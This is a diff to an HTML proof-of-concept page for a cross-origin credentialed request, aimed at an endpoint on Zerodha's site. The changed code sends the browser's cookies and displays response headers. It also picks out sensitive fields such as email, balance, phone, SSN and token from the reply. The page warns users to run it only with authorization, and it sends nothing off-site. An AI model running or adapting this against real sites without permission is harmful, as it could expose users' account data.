@@ -2,72 +2,66 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CORS Credentialed PoC (Local)</title>
+  <title>Zerodha CORS Credentialed PoC — Local Only</title>
   <style>
     body{font-family:system-ui,Arial;padding:1rem;line-height:1.4}
     pre{white-space:pre-wrap;border:1px solid #ddd;padding:1rem;background:#f9f9f9;max-height:60vh;overflow:auto}
-    code{background:#f3f3f3;padding:.1rem .3rem;border-radius:3px}
-    label{display:block;margin-top:.5rem}
-    input[type=text]{width:100%;padding:.4rem;margin-top:.2rem}
-    button{margin-top:.6rem;padding:.5rem 0.8rem}
+    input, select{padding:.3rem;margin:.2rem 0;width:100%}
+    button{padding:.5rem 0.8rem;margin-top:.6rem}
+    .warn{color:#a00;font-weight:600}
   </style>
 </head>
 <body>
-  <h2>CORS Credentialed PoC — Local Use Only</h2>
+  <h2>Zerodha CORS Credentialed PoC — Local Use Only</h2>
+  <p class="warn">Only run this with explicit written authorization from Zerodha. Do not host publicly. Use a dedicated browser profile logged into the authorized test account.</p>
 
-  <p><strong>IMPORTANT:</strong> Run this only if you have explicit authorization from the target owner. Do not host this file on a public server. Use a local browser with a test account logged in.</p>
-
-  <label>Endpoint URL (edit to test):
+  <label>Endpoint URL:
     <input id="endpoint" type="text" value="https://zerodha.com/z-connect/wp-json/wp/v2/pages/664">
   </label>
 
-  <label>Credentials mode:
+  <label>Mode:
+    <select id="mode">
+      <option value="cors">cors</option>
+      <option value="no-cors">no-cors</option>
+    </select>
+  </label>
+
+  <label>Credentials:
     <select id="cred">
-      <option value="include">include (send cookies)</option>
+      <option value="include">include (send cookies) — USE ONLY IF AUTHORIZED</option>
       <option value="same-origin">same-origin</option>
       <option value="omit">omit (no cookies)</option>
     </select>
   </label>
 
-  <label>HTTP Method:
-    <select id="method">
-      <option>GET</option>
-    </select>
-  </label>
-
-  <button id="run">Run PoC (local only)</button>
-
+  <button id="run">Run credentialed fetch (local only)</button>
   <p id="status">Status: idle</p>
-  <pre id="out">Output will appear here. Open DevTools Console/Network for more details.</pre>
+  <pre id="out">Output will appear here. Check DevTools Console & Network for more details.</pre>
 
 <script>
 document.getElementById('run').addEventListener('click', async () => {
   const ENDPOINT = document.getElementById('endpoint').value.trim();
+  const MODE = document.getElementById('mode').value;
   const CREDENTIALS = document.getElementById('cred').value;
-  const METHOD = document.getElementById('method').value || 'GET';
 
   document.getElementById('status').innerText = 'Running fetch... (check Console & Network)';
-  document.getElementById('out').innerText = 'waiting for response...';
+  document.getElementById('out').innerText = 'Waiting for response... (local only)';
 
   try {
     const t0 = Date.now();
-    // Note: mode 'cors' allows cross-origin requests and is needed to read response if server allows CORS.
     const resp = await fetch(ENDPOINT, {
-      method: METHOD,
-      mode: 'cors',
+      method: 'GET',
+      mode: MODE,
       credentials: CREDENTIALS,
-      // Do NOT include any malicious exfil headers/body here.
-      headers: {
-        // you can add a harmless test header if needed e.g. 'X-Test-PoC': '1'
-      }
+      redirect: 'follow'
     });
-
     const t1 = Date.now();
-    // collect headers (safe)
+
+    // Collect headers (local-only)
     const headers = {};
     resp.headers.forEach((v,k) => headers[k.toLowerCase()] = v);
 
-    // header summary for quick view
+    // Create header summary
     const hdrSummary = [
       'status: ' + resp.status,
       'access-control-allow-origin: ' + (headers['access-control-allow-origin'] || 'Not Present'),
@@ -77,35 +71,58 @@ document.getElementById('run').addEventListener('click', async () => {
       'vary: ' + (headers['vary'] || 'Not Present')
     ].join('\\n');
 
-    // try to parse body safely (don't save or post it)
+    // Read body safely and try to extract common sensitive fields
     let bodyPreview = '';
+    let parsed = null;
     const ct = resp.headers.get('content-type') || '';
     if (ct.includes('json')) {
       try {
-        const j = await resp.json();
-        bodyPreview = JSON.stringify(j, null, 2).slice(0, 20000);
+        parsed = await resp.json();
+        bodyPreview = JSON.stringify(parsed, null, 2).slice(0, 20000);
       } catch (e) {
         bodyPreview = 'JSON parse error: ' + e.toString();
       }
     } else {
       try {
-        const t = await resp.text();
-        bodyPreview = t.slice(0, 20000);
-      } catch (e) {
+        const txt = await resp.text();
+        bodyPreview = txt.slice(0, 20000);
+      } catch(e){
         bodyPreview = 'Text read error: ' + e.toString();
       }
     }
 
-    document.getElementById('status').innerText = `Request finished: ${resp.status} (${t1-t0} ms)`;
+    // Heuristic extraction — only local display
+    const extracted = {};
+    try {
+      if (parsed && typeof parsed === 'object') {
+        // common fields to look for
+        const keys = ['email','email_address','name','full_name','username','balance','account_id','phone','ssn','id','token'];
+        for (const k of keys) {
+          if (k in parsed) extracted[k] = parsed[k];
+        }
+        // also check nested 'data' or arrays first element
+        if (!Object.keys(extracted).length && parsed.data) {
+          const cand = parsed.data[0] || parsed.data;
+          for (const k of keys) if (cand && k in cand) extracted[k] = cand[k];
+        }
+      }
+    } catch (e) {
+      console.warn('extract error', e);
+    }
+
+    document.getElementById('status').innerText = `Request finished: ${resp.status} (${t1 - t0} ms)`;
     document.getElementById('out').innerText = [
       '=== Header summary ===',
       hdrSummary,
+      '',
+      '=== Extracted (local-only, heuristic) ===',
+      (Object.keys(extracted).length ? JSON.stringify(extracted, null, 2) : 'No common sensitive keys found by heuristic'),
       '',
       '=== Body preview (trimmed) ===',
       bodyPreview
     ].join('\\n\\n');
 
-    console.log('PoC result:', { status: resp.status, headers, bodyPreview });
+    console.log('Local PoC result', {status: resp.status, headers, extracted, preview: bodyPreview.slice(0,2000)});
   } catch (err) {
     document.getElementById('status').innerText = 'Fetch failed: ' + err;
     document.getElementById('out').innerText = 'Error (see console): ' + err;
